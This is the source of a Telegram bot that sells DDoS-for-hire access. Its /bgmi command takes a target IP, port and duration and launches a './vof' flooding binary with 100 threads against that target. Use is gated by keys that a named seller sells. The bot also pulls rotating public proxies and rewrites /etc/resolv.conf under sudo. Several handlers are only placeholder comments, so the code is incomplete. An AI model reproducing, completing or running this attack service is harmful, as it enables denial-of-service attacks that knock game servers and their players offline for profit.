from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import requests
import subprocess
import json
import os
import random
import string
import datetime
import itertools
from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME

USER_FILE = "users.json"
KEY_FILE = "keys.json"

DEFAULT_THREADS = 100
users = {}
keys = {}
user_processes = {}

# DNS Servers to be added
DNS_SERVERS = ['168.63.129.16', '8.8.8.8', '8.8.4.4']

# Proxy related functions
proxy_api_url = 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http,socks4,socks5&timeout=500&country=all&ssl=all&anonymity=all'

proxy_iterator = None

def add_dns_entries():
    """Adds specified DNS servers to /etc/resolv.conf if they are not already present."""
    resolv_file = '/etc/resolv.conf'
    try:
        # Check if we have write access
        if os.access(resolv_file, os.W_OK):
            with open(resolv_file, 'r') as file:
                lines = file.readlines()
            
            # Add DNS entries if not already present
            with open(resolv_file, 'a') as file:
                for dns in DNS_SERVERS:
                    if any(f'nameserver {dns}' in line for line in lines):
                        print(f"DNS {dns} already present.")
                    else:
                        file.write(f"nameserver {dns}\n")
                        print(f"Added DNS {dns} to {resolv_file}.")
        else:
            print(f"Permission denied: cannot write to {resolv_file}. Run the bot with sudo.")
    except Exception as e:
        print(f"Error configuring DNS: {e}")

def get_proxies():
    global proxy_iterator
    try:
        response = requests.get(proxy_api_url)
        if response.status_code == 200:
            proxies = response.text.splitlines()
            if proxies:
                proxy_iterator = itertools.cycle(proxies)
                return proxy_iterator
    except Exception as e:
        print(f"Error fetching proxies: {str(e)}")
    return None

def get_next_proxy():
    global proxy_iterator
    if proxy_iterator is None:
        proxy_iterator = get_proxies()
    return next(proxy_iterator, None)

def get_proxy_dict():
    proxy = get_next_proxy()
    return {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None

# Load, save, and key generation functions...
# (Your load_data, save_users, load_keys, save_keys, generate_key, etc., go here)

# Start and Redeem command handlers...
# (Your existing handlers like genkey, redeem, allusers, etc., go here)

async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global user_processes
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key. Buy key from @SomsPvt")
        return

    if len(context.args) != 3:
        await update.message.reply_text('Usage: /bgmi <target_ip> <port> <duration>')
        return

    target_ip = context.args[0]
    port = context.args[1]
    duration = context.args[2]

    command = ['./vof', target_ip, port, duration, str(DEFAULT_THREADS)]

    process = subprocess.Popen(command)
    user_processes[user_id] = {"process": process, "command": command, "target_ip": target_ip, "port": port}
    
    await update.message.reply_text(f'Flooding parameters set: {target_ip}:{port} for {duration} seconds with {DEFAULT_THREADS} threads.OWNER- @SomsPvt')

# Main bot setup function
def main():
    add_dns_entries()  # Configure DNS when the bot starts

    app = ApplicationBuilder().token(BOT_TOKEN).build()

    # Register handlers here...
    app.add_handler(CommandHandler("genkey", genkey))
    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("allusers", allusers))
    app.add_handler(CommandHandler("bgmi", bgmi))

    print("Bot is starting...")
    app.run_polling()

if __name__ == "__main__":
    # Ensure script is run with sudo for DNS modification
    if os.geteuid() != 0:
        print("This script must be run with sudo.")
        exit(1)
    
    main()
  
